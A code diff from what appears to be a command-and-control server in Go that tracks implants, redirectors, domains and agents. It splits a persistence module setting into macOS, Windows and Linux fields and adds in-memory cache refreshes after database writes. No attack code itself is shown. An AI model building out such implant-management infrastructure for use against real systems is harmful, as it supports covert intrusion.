@@ -123,7 +123,9 @@ type SysInfo struct {
 
 type Modules struct {
     Coms string   `json:"coms"`
-    Persistence string `json:"persistence"`  
+    PersistenceOSX string `json:"persistenceosx"`
+    PersistenceWindows string `json:"persistencewindows"`
+    PersistenceLinux string `json:"persistencelinux"`  
 }
 
 /// Vps Parameters
@@ -1267,6 +1269,7 @@ func addImplantDB(implant *Implant) error{
 	stmt,_ := db.Prepare("INSERT INTO implants (name,ttl,resptime,redtoken,bitoken,modules) VALUES (?,?,?,?,?,?)")
     defer stmt.Close()
 	_,err = stmt.Exec(implant.Name,implant.Ttl,implant.Resptime,implant.RedToken,implant.BiToken,implant.Modules)
+    go updateMemoryDB("implants")
 	return err
 
 }
@@ -1333,6 +1336,7 @@ func rmImplantDB(name string) error{
 	stmt,_ := db.Prepare("DELETE FROM implants where name=?")
     defer stmt.Close()
 	_,err = stmt.Exec(name)
+    go updateMemoryDB("implants")
 	return err
 
 }
@@ -1607,6 +1611,7 @@ func setUsedDomainDB(name string,value string) error{
 	stmt,_ := db.Prepare("UPDATE domains SET active=? where name=?")
     defer stmt.Close()
 	_,err = stmt.Exec(value,name)
+    go updateMemoryDB("domains")
 	return err
 
 }
@@ -1802,6 +1807,7 @@ func setRedLastCheckedDB(rid string,value string) error{
 	stmt,_ := db.Prepare("UPDATE redirectors SET lastchecked=? where rid=?")
     defer stmt.Close()
 	_,err = stmt.Exec(value,rid)
+    go updateMemoryDB("redirectors")
 	return err
 
 }
@@ -1817,6 +1823,7 @@ func setRedHiveTDB(rid string,value int) error{
 	stmt,_ := db.Prepare("UPDATE redirectors SET hivetimeout=? where rid=?")
     defer stmt.Close()
 	_,err = stmt.Exec(value,rid)
+    go updateMemoryDB("redirectors")
 	return err
 
 }
@@ -1838,6 +1845,7 @@ func bichitoStatus(job *Job){
         setBichitoStatusDB(job.Chid,"Online")
     }
 
+    go updateMemoryDB("bichitos")
     return
 }
 
